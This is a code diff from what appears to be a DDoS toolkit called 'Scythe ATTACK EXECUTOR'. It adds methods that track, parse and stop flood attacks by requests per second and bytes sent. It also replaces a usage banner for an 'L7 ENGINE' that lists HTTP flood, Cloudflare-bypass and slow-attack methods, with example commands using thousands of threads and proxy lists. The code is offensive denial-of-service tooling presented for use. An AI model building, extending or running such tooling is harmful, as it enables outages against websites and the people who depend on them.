+            if attack["id"] == attack_id:
+                attack["peak_rps"] = peak_rps
+                attack["total_requests"] = total_requests
+                attack["total_bytes"] = total_bytes
+                break
+        state.remove_attack(attack_id)
+        with self.lock:
+            if attack_id in self.processes:
+                del self.processes[attack_id]
+        print(f"\n[+] Attack {attack_id[:12]}... completed:")
+        print(f"    Total: {total_requests:,} | Peak RPS: {peak_rps:,} | Bytes: {total_bytes:,}")
+        print(f"    Duration: {elapsed:.1f}s\n")
+
+    def _parse_rps_from_line(self, line):
+        rps = 0
+        total = 0
+        bytes_sent = 0
+        m = self._rps_regex.search(line)
+        if m:
+            rps = int(m.group(1))
+        m = self._total_regex.search(line)
+        if m:
+            total = int(m.group(1))
+        m = self._bytes_regex.search(line)
+        if m:
+            bytes_sent = int(m.group(1))
+        return rps, total, bytes_sent
+
+    def stop_attack(self, attack_id):
+        with self.lock:
+            if attack_id in self.processes:
+                proc = self.processes[attack_id]
+                try:
+                    if hasattr(proc, 'terminate'):
+                        proc.terminate()
+                        proc.kill()
+                except:
+                    pass
+                state.remove_attack(attack_id)
+                return True
+        return False
+
+    def stop_all(self):
+        with self.lock:
+            for aid in list(self.processes.keys()):
+                try:
+                    proc = self.processes[aid]
+                    if hasattr(proc, 'terminate'):
+                        proc.terminate()
+                        proc.kill()
+                except:
+                    pass
+            self.processes.clear()
+        state.stop_all()
+
 if __name__ == '__main__':
-    if len(sys.argv) < 4:
-        print("\n" + "="*60)
-        print("🔥 SCYTHE L7 ENGINE v15.0 — PROFESSIONAL")
-        print("="*60)
-        print("\nUsage:")
-        print("  python3 l7_engine.py <method> <target> <duration> [threads] [proxy_file]")
-        print("\n6 Methods:")
-        for m in ['httpbypass', 'cf-flood', 'slow', 'httpget', 'httpflood', 'auto']:
-            print(f"  - {m}")
-        print("\nExamples:")
-        print("  python3 l7_engine.py httpbypass example.com 60 500")
-        print("  python3 l7_engine.py cf-flood example.com 120 1000")
-        print("  python3 l7_engine.py auto example.com 300 2000")
-        print("="*60)
-        sys.exit(1)
-
-    args = [a for a in sys.argv[1:] if a != '--debug']
-    method = args[0].lower()
-    target = args[1]
-    duration = args[2]
-    threads = args[3] if len(args) > 3 else '100'
-    proxy_file = args[4] if len(args) > 4 else find_proxy_file()
-
-    engine = L7AttackEngine(target, duration, threads, proxy_file, method)
-    engine.start()
+    print("Scythe ATTACK EXECUTOR v11.0")
+    print(f"Methods: {len(METHODS)} (6 L7 + 4 L4)")
+    cpu, ram, disk = get_vps_specs()
+    print(f"VPS: {cpu} cores | {round(ram,1)}GB RAM | {round(disk,1)}GB disk")
+    print(f"Proxy count: {AttackExecutor().get_proxy_count()}")
